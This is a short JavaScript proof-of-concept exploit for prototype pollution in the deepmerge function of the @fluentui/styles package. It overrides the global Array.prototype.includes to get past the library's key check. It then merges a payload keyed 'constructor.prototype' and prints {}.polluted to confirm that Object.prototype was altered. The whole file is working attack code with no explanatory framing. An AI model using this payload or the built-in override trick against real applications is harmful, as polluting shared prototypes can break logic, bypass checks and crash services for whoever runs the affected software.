Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const styles = require('@fluentui/styles');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
const source2 = { k3: {} };
console.log({}.polluted);
let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);